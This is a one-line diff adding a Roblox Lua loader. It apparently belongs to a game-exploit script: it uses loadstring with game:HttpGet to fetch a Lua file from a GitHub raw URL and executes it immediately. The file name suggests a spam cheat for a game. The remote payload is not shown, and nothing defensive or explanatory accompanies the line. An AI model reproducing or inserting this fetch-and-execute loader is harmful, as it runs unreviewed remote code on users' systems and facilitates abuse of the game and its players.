@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/war-of-the-worlds-spam3-1lxrfygso7jc7h.lua"))()
